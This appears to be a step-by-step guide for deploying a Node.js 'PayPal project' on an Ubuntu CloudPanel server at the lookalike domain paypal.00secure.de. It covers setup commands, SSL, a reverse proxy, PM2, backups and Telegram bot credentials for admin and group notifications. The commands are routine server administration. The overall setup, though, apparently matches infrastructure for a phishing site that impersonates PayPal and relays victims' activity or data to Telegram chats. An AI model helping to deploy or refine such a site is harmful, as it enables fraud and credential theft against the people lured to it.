# Deployment Guide for Ubuntu 22.04 with CloudPanel

This guide will help you deploy the PayPal project on an Ubuntu 22.04 server using CloudPanel with the domain paypal.00secure.de.

## Prerequisites

- Ubuntu 22.04 server with CloudPanel installed
- Domain (paypal.00secure.de) pointed to your server's IP address
- SSH access to your server
- Node.js 16+ installed on your server

## Step 1: Install Required Dependencies on the Server

```bash
# SSH into your server
ssh user@your-server-ip

# Update package lists
sudo apt update

# Install required packages
sudo apt install -y git curl build-essential

# Install Node.js 16+ if not already installed
curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -
sudo apt install -y nodejs

# Install PM2 globally for process management
sudo npm install -g pm2
```

## Step 2: Set Up Your Domain in CloudPanel

1. Log in to CloudPanel
2. Navigate to Sites → Add Site
3. Enter domain: `paypal.00secure.de`
4. Choose Node.js as the application type
5. Set the Node.js version to 16 or higher
6. Set the document root to `/public`
7. Save the site configuration

## Step 3: Configure SSL for Your Domain

1. In CloudPanel, go to your site settings
2. Navigate to the SSL section
3. Select "Let's Encrypt" to automatically generate and install SSL certificates
4. Enable "Force HTTPS" to redirect all HTTP traffic to HTTPS
5. Save the SSL configuration

## Step 4: Deploy Your Application

### Option 1: Deploy via Git

```bash
# SSH into your server
ssh user@your-server-ip

# Navigate to your site directory
cd /var/www/paypal.00secure.de

# Clone your repository
git clone https://your-git-repo-url.git .

# Install dependencies
npm run install-all

# Build the client
npm run build

# Initialize the database
npm run init-db
```

### Option 2: Deploy via SFTP

1. Use an SFTP client like FileZilla to connect to your server
2. Upload all files from your local project to `/var/www/paypal.00secure.de` on the server
3. SSH into your server and run:

```bash
cd /var/www/paypal.00secure.de
npm run install-all
npm run build
npm run init-db
```

## Step 5: Configure Environment Variables

Create a `.env` file in your project root:

```bash
cd /var/www/paypal.00secure.de
nano .env
```

Add the following content:
```
TELEGRAM_BOT_TOKEN=your_telegram_bot_token
ADMIN_CHAT_ID=your_admin_chat_id
GROUP_CHAT_ID=your_group_chat_id
PORT=3000
NODE_ENV=production
```

## Step 6: Configure Nginx as a Reverse Proxy

1. In CloudPanel, go to your site settings → Vhost Editor
2. Add the following configuration:

```nginx
location / {
    proxy_pass http://localhost:3000;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection 'upgrade';
    proxy_set_header Host $host;
    proxy_cache_bypass $http_upgrade;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}
```

3. Save the configuration

## Step 7: Set Up PM2 for Process Management

```bash
# Navigate to your project directory
cd /var/www/paypal.00secure.de

# Start your application with PM2
pm2 start server/index.js --name "paypal-app" --env production

# Make PM2 start on system boot
pm2 startup
pm2 save
```

## Step 8: Set Up Logs Directory

```bash
# Create logs directory
mkdir -p /var/www/paypal.00secure.de/logs
chmod 755 /var/www/paypal.00secure.de/logs
```

## Step 9: Set Up a Database Backup Strategy

```bash
# Create a backup directory
mkdir -p /var/www/paypal.00secure.de/backups

# Create a backup script
nano /var/www/paypal.00secure.de/backup.sh
```

Add the following content to the backup script:
```bash
#!/bin/bash
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
BACKUP_DIR="/var/www/paypal.00secure.de/backups"
mkdir -p $BACKUP_DIR
cp /var/www/paypal.00secure.de/data/database.sqlite $BACKUP_DIR/database_$TIMESTAMP.sqlite
# Remove backups older than 30 days
find $BACKUP_DIR -name "database_*.sqlite" -type f -mtime +30 -delete
```

Make the script executable and add it to cron:
```bash
chmod +x /var/www/paypal.00secure.de/backup.sh
crontab -e
```

Add this line to run the backup daily at 2 AM:
```
0 2 * * * /var/www/paypal.00secure.de/backup.sh
```

## Step 10: Test Your Deployment

1. Visit https://paypal.00secure.de in your browser
2. Test the complete user flow
3. Verify that Telegram notifications are working
4. Check that all bot commands function correctly

## Troubleshooting

### Application Not Starting

Check PM2 logs:
```bash
pm2 logs paypal-app
```

Verify environment variables:
```bash
cat /var/www/paypal.00secure.de/.env
```

### Nginx Proxy Issues

Check Nginx error logs:
```bash
tail -f /var/log/nginx/error.log
```

Verify Nginx configuration:
```bash
nginx -t
```

### Database Issues

Check if the database file exists:
```bash
ls -la /var/www/paypal.00secure.de/data/
```

Reinitialize the database if needed:
```bash
cd /var/www/paypal.00secure.de
npm run init-db
```

### SSL Certificate Problems

Renew certificates through CloudPanel SSL interface or manually:
```bash
certbot renew
```

## Updating the Application

To update your application:

```bash
# SSH into your server
ssh user@your-server-ip

# Navigate to your project directory
cd /var/www/paypal.00secure.de

# Pull the latest changes (if using Git)
git pull

# Or upload new files via SFTP

# Install dependencies (if needed)
npm run install-all

# Build the client
npm run build

# Restart the application
pm2 restart paypal-app
```

## Security Recommendations

1. Set up a firewall:
```bash
sudo ufw allow ssh
sudo ufw allow http
sudo ufw allow https
sudo ufw enable
```

2. Set up fail2ban to protect against brute force attacks:
```bash
sudo apt install fail2ban
sudo systemctl enable fail2ban
sudo systemctl start fail2ban
```

3. Keep your server updated:
```bash
sudo apt update
sudo apt upgrade
```

4. Consider setting up regular security audits and monitoring.
